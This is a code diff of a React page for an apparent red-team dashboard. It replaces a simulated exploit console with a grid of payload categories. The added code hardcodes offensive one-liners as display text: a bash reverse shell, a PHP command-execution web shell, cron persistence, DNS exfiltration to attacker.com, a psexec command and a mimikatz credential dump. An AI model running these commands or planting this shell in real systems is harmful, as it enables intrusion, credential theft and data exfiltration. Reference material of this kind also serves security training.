@@ -1,223 +1,101 @@
 import { CommandHeader } from "@/components/CommandHeader";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
 import { Badge } from "@/components/ui/badge";
-import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { useState } from "react";
 import { useToast } from "@/hooks/use-toast";
-import { Sword, Loader2, Terminal, Target, Zap } from "lucide-react";
+import { useNavigate } from "react-router-dom";
+import { Terminal, Target, Users, Activity, Globe, Lock, Zap, ArrowLeft, Download, Key, Shield } from "lucide-react";
 
 const RedTeamModule = () => {
-  const [target, setTarget] = useState("");
-  const [payload, setPayload] = useState("");
-  const [executing, setExecuting] = useState(false);
-  const [output, setOutput] = useState<string[]>([]);
+  const navigate = useNavigate();
   const { toast } = useToast();
+  const [selectedPayload, setSelectedPayload] = useState<string | null>(null);
 
-  const executePayload = async () => {
-    if (!target.trim()) {
-      toast({
-        title: "Error",
-        description: "Please enter a target",
-        variant: "destructive",
-      });
-      return;
-    }
-
-    setExecuting(true);
-    const newOutput: string[] = [];
-
-    try {
-      newOutput.push(`[*] Initializing exploit framework...`);
-      setOutput([...newOutput]);
-      await new Promise(resolve => setTimeout(resolve, 1000));
-
-      newOutput.push(`[*] Target: ${target}`);
-      newOutput.push(`[*] Payload: ${payload || "reverse_tcp"}`);
-      setOutput([...newOutput]);
-      await new Promise(resolve => setTimeout(resolve, 1000));
-
-      newOutput.push(`[*] Scanning for open ports...`);
-      setOutput([...newOutput]);
-      await new Promise(resolve => setTimeout(resolve, 1500));
-
-      newOutput.push(`[+] Found open ports: 80, 443, 22, 3389`);
-      newOutput.push(`[*] Attempting exploitation...`);
-      setOutput([...newOutput]);
-      await new Promise(resolve => setTimeout(resolve, 2000));
-
-      newOutput.push(`[+] Exploit successful!`);
-      newOutput.push(`[+] Session opened on ${target}`);
-      newOutput.push(`[*] Meterpreter session 1 opened`);
-      setOutput([...newOutput]);
-
-      toast({
-        title: "Simulation Complete",
-        description: "Red team operation completed successfully",
-      });
-    } catch (error) {
-      newOutput.push(`[-] Exploitation failed: ${error}`);
-      setOutput([...newOutput]);
-      toast({
-        title: "Operation Failed",
-        description: error instanceof Error ? error.message : "Unknown error",
-        variant: "destructive",
-      });
-    } finally {
-      setExecuting(false);
-    }
-  };
+  const payloadTypes = [
+    { name: "Reverse Shell", icon: Terminal, description: "Netcat, Bash, PowerShell", category: "shells" },
+    { name: "Web Shells", icon: Globe, description: "PHP, ASP, JSP shells", category: "webshells" },
+    { name: "Privilege Escalation", icon: Lock, description: "Linux & Windows exploits", category: "privesc" },
+    { name: "Persistence", icon: Activity, description: "Registry, Cron, Services", category: "persistence" },
+    { name: "Lateral Movement", icon: Users, description: "PsExec, WMI, RDP", category: "lateral" },
+    { name: "Data Exfiltration", icon: Download, description: "DNS, ICMP, HTTPS", category: "exfil" },
+    { name: "Credential Dumping", icon: Key, description: "Mimikatz, SAM, LSASS", category: "creds" },
+    { name: "Obfuscation", icon: Shield, description: "Encoding, Encryption", category: "obfuscation" },
+  ];
 
   return (
     <div className="min-h-screen bg-background">
       <CommandHeader />
       
       <main className="container mx-auto px-6 py-8">
+        <Button variant="ghost" onClick={() => navigate("/")} className="mb-6 gap-2">
+          <ArrowLeft className="h-4 w-4" />
+          Back to Dashboard
+        </Button>
+
         <div className="mb-8">
           <div className="flex items-center gap-3 mb-2">
-            <Sword className="h-8 w-8 text-cyber-red" />
+            <Target className="h-8 w-8 text-cyber-red" />
             <h1 className="text-3xl font-bold font-mono">Red Team Operations</h1>
           </div>
-          <p className="text-muted-foreground">
-            Metasploit & Empire framework integration for offensive security testing
-          </p>
+          <p className="text-muted-foreground">Advanced offensive security tools and techniques</p>
         </div>
 
-        <Tabs defaultValue="exploit" className="space-y-6">
-          <TabsList className="grid w-full grid-cols-3">
-            <TabsTrigger value="exploit">
-              <Target className="h-4 w-4 mr-2" />
-              Exploit
-            </TabsTrigger>
-            <TabsTrigger value="payloads">
-              <Zap className="h-4 w-4 mr-2" />
-              Payloads
-            </TabsTrigger>
-            <TabsTrigger value="sessions">
-              <Terminal className="h-4 w-4 mr-2" />
-              Sessions
-            </TabsTrigger>
-          </TabsList>
-
-          <TabsContent value="exploit" className="space-y-4">
-            <Card className="p-6 bg-card/50 backdrop-blur-sm border-cyber-red/30">
-              <div className="space-y-4">
-                <div>
-                  <label className="text-sm font-medium mb-2 block">Target Host</label>
-                  <Input
-                    type="text"
-                    placeholder="192.168.1.100"
-                    value={target}
-                    onChange={(e) => setTarget(e.target.value)}
-                    className="font-mono"
-                    disabled={executing}
-                  />
-                </div>
-
-                <div>
-                  <label className="text-sm font-medium mb-2 block">Payload Type</label>
-                  <Input
-                    type="text"
-                    placeholder="windows/meterpreter/reverse_tcp"
-                    value={payload}
-                    onChange={(e) => setPayload(e.target.value)}
-                    className="font-mono"
-                    disabled={executing}
-                  />
-                </div>
-
-                <Button 
-                  onClick={executePayload} 
-                  disabled={executing}
-                  className="w-full"
-                  variant="destructive"
-                >
-                  {executing ? (
-                    <>
-                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                      Executing...
-                    </>
-                  ) : (
-                    <>
-                      <Sword className="mr-2 h-4 w-4" />
-                      Execute Exploit
-                    </>
-                  )}
-                </Button>
-              </div>
+        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
+          {payloadTypes.map((type) => (
+            <Card 
+              key={type.name} 
+              className="p-6 hover:border-cyber-red/50 transition-colors cursor-pointer bg-card/50 backdrop-blur-sm"
+              onClick={() => {
+                toast({ title: `${type.name} Payload`, description: `Loading ${type.description}...` });
+                setSelectedPayload(type.category);
+              }}
+            >
+              <type.icon className="h-8 w-8 text-cyber-red mb-3" />
+              <h3 className="font-semibold mb-2 font-mono">{type.name}</h3>
+              <p className="text-sm text-muted-foreground">{type.description}</p>
             </Card>
+          ))}
+        </div>
 
-            <Card className="p-6 bg-black/90 border-cyber-red/30">
-              <div className="flex items-center justify-between mb-4">
-                <div className="flex items-center gap-2">
-                  <Terminal className="h-5 w-5 text-cyber-red" />
-                  <span className="font-mono text-sm">Console Output</span>
-                </div>
-                <Badge variant="outline" className="font-mono">
-                  {output.length} lines
-                </Badge>
-              </div>
-              
-              <div className="font-mono text-xs space-y-1 max-h-[400px] overflow-y-auto">
-                {output.length === 0 ? (
-                  <p className="text-muted-foreground">
-                    Awaiting exploit execution...
-                  </p>
-                ) : (
-                  output.map((line, idx) => (
-                    <div
-                      key={idx}
-                      className={
-                        line.startsWith("[+]")
-                          ? "text-green-500"
-                          : line.startsWith("[-]")
-                          ? "text-red-500"
-                          : line.startsWith("[*]")
-                          ? "text-cyan-500"
-                          : "text-white"
-                      }
-                    >
-                      {line}
-                    </div>
-                  ))
-                )}
-              </div>
-            </Card>
-          </TabsContent>
-
-          <TabsContent value="payloads">
-            <Card className="p-6">
-              <h3 className="text-lg font-semibold mb-4">Available Payloads</h3>
-              <div className="grid gap-2">
-                {[
-                  "windows/meterpreter/reverse_tcp",
-                  "linux/x86/meterpreter/reverse_tcp",
-                  "php/meterpreter_reverse_tcp",
-                  "python/meterpreter/reverse_tcp",
-                  "java/jsp_shell_reverse_tcp",
-                ].map((p) => (
-                  <div
-                    key={p}
-                    className="p-3 border rounded-lg hover:bg-muted cursor-pointer font-mono text-sm"
-                    onClick={() => setPayload(p)}
-                  >
-                    {p}
+        <Card className="p-6 bg-card/50 backdrop-blur-sm">
+          <div className="flex items-center gap-2 mb-4">
+            <Target className="h-5 w-5 text-cyber-purple" />
+            <h2 className="text-xl font-semibold font-mono">{selectedPayload ? "Payload Examples" : "TTP Database"}</h2>
+          </div>
+          {!selectedPayload ? (
+            <>
+              <p className="text-sm text-muted-foreground mb-4">MITRE ATT&CK framework tactics</p>
+              <div className="space-y-2 mb-4">
+                {["Initial Access", "Execution", "Persistence", "Lateral Movement"].map((tactic, idx) => (
+                  <div key={tactic} className="flex justify-between items-center">
+                    <span className="text-sm font-mono">{tactic}</span>
+                    <Badge>{12 + idx} techniques</Badge>
                   </div>
                 ))}
               </div>
-            </Card>
-          </TabsContent>
-
-          <TabsContent value="sessions">
-            <Card className="p-6 text-center border-dashed">
-              <Terminal className="h-12 w-12 mx-auto mb-4 text-muted-foreground" />
-              <p className="text-muted-foreground">
-                No active sessions. Execute an exploit to establish a session.
-              </p>
-            </Card>
-          </TabsContent>
-        </Tabs>
+              <Button className="w-full bg-cyber-purple hover:bg-cyber-purple/80 text-background" onClick={() => toast({ title: "TTP Database", description: "Opening MITRE ATT&CK..." })}>
+                <Zap className="mr-2 h-4 w-4" />Browse Full Database
+              </Button>
+            </>
+          ) : (
+            <div className="space-y-4">
+              <Button variant="ghost" size="sm" onClick={() => setSelectedPayload(null)}>← Back</Button>
+              <Card className="p-4 bg-background/50">
+                <code className="text-xs font-mono text-cyber-green whitespace-pre-wrap block">
+                  {selectedPayload === "shells" && `# Reverse Shells\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\npython -c 'import socket...'`}
+                  {selectedPayload === "webshells" && `<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>`}
+                  {selectedPayload === "privesc" && `# Linux PrivEsc\nsudo -l\nfind / -perm -u=s -type f 2>/dev/null`}
+                  {selectedPayload === "persistence" && `# Cron Job\necho "* * * * * /tmp/shell.sh" | crontab -`}
+                  {selectedPayload === "lateral" && `# PsExec\npsexec.py domain/user:pass@192.168.1.10 cmd`}
+                  {selectedPayload === "exfil" && `# DNS Exfil\nfor i in $(cat data.txt); do dig $i.attacker.com; done`}
+                  {selectedPayload === "creds" && `# Mimikatz\nmimikatz.exe "sekurlsa::logonpasswords"`}
+                  {selectedPayload === "obfuscation" && `# Base64\necho 'cmd' | base64`}
+                </code>
+              </Card>
+            </div>
+          )}
+        </Card>
       </main>
     </div>
   );
